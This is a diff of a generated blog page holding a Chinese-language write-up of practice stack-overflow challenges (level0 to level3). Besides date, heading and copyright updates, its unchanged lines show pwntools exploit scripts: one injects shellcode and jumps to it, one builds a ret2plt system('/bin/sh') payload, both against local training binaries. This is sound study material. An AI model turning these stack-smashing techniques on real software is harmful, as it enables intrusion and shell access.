@@ -164,7 +164,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2025-12-26 09:56:21
+          2026-01-05 18:10:10
         </span>
         
               <span class="post-tags">
@@ -191,7 +191,7 @@
           
       </div>
       <div class="markdown-body">
-        <h2 id="level0">level0</h2>
+        <h2 id="level0-pwn0">level0: pwn0</h2>
 <p>比较简单，直接溢出，覆盖返回地址为callsystem的地址就可以了。坑点，Ubuntu22需要再p64(callsystem_addr + 1)，需要在后面加上1或2或4才能成功获取shell。</p>
 <p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251217003419669.png" alt="image-20251217003419669"></p>
 <p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251214195018158.png" alt="image-20251214195018158"></p>
@@ -288,7 +288,7 @@
 <li><strong>为何 +1/+4 有效</strong>：本质都是为了<strong>跳过 <code>push rbp</code></strong> 这一行代码，从而避免 RSP 发生 8 字节的偏移，维持栈的对齐状态。</li>
 <li>**学习到：**如果远程或高版本 Ubuntu 打不通，优先尝试 <strong>地址+1</strong> 或者在 Payload 里加一个 <strong><code>ret</code> 的地址</strong>（Gadget）来调整栈平衡。</li>
 </ul>
-<h2 id="level1">level1</h2>
+<h2 id="level1-pwn1">level1: pwn1</h2>
 <p>比较简单，32位，直接写入shellcode。栈可执行，在栈中，直接写入shellcode。</p>
 <p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251217003510796.png" alt="image-20251217003510796"></p>
 <p>定位漏洞函数。</p>
@@ -299,7 +299,7 @@
 <p>level1输出了buf的地址，再向buf中写入shellcode。利用栈溢出，覆盖返回地址，返回地址覆盖为buf的地址，也就是shellcode的地址，拿到shell。</p>
 <p>poc如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># generate shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;../practices/pwn1/level1&#x27;</span>)</span><br><span class="line">addr_str = io.recvline()[<span class="number">14</span>:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(addr_str)</span><br><span class="line">addr_buf = <span class="built_in">int</span>(addr_str,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x04</span> -<span class="built_in">len</span>(shellcode)) + p32(addr_buf)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="level2">level2</h2>
+<h2 id="level2-pwn2">level2: pwn2</h2>
 <p>这题之前做过<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，相同的思路。<code>.got.plt</code>中有system函数的地址，然后再找/bin/sh的地址，即可获得shell。</p>
 <p>查看防护情况。</p>
 <p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251218015418433.png" alt="image-20251218015418433"></p>
@@ -313,12 +313,13 @@
 <p>完整的poc为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../practices/pwn2/level2&#x27;</span>)</span><br><span class="line">systemaddr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binshaddr = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="comment"># print(hex(systemaddr))</span></span><br><span class="line"><span class="comment"># print(hex(binshaddr))</span></span><br><span class="line">io = process(<span class="string">&#x27;../practices/pwn2/level2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> *(<span class="number">136</span> + <span class="number">4</span>),systemaddr, <span class="string">b&#x27;B&#x27;</span> * <span class="number">4</span>, binshaddr])</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p>注意systemaddr、binshaddr地址要为整数。</p>
+<h2 id="level3-pwn2-x64">level3: pwn2_x64</h2>
 <h2 id="level3">level3</h2>
 <p>和上一题类似，这题没有<code>system</code>函数了。</p>
 <p>防护检查。</p>
 <p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251226003946023.png" alt="image-20251226003946023"></p>
-<p>漏洞点，这里无<code>system</code>函数了。</p>
-<p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251226004038863.png" alt="image-20251226004038863"></p>
+<p>漏洞点，0x100字节，很明显超出了136字节。这里无<code>system</code>函数了。</p>
+<p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251231002300290.png" alt="image-20251231002300290"></p>
 <h2 id="参考">参考</h2>
 <hr class="footnotes-sep">
 <section class="footnotes">
@@ -342,7 +343,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2025-12-26 09:56:21
+              2026-01-05 18:10:10
             </span>
             
                   <span class="post-tags">
@@ -382,7 +383,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0"><span class="toc-text">level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0-pwn0"><span class="toc-text">level0: pwn0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1-pwn1"><span class="toc-text">level1: pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2-pwn2"><span class="toc-text">level2: pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3-pwn2-x64"><span class="toc-text">level3: pwn2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
       
     </div>
   </div>
@@ -427,7 +428,7 @@
     
     <div class="footer-more">
       
-        <a href="https://x2nn.github.io">Copyright © 2024 - 2025</a>
+        <a href="https://x2nn.github.io">Copyright © 2024 - 2026</a>
         
     </div>
   
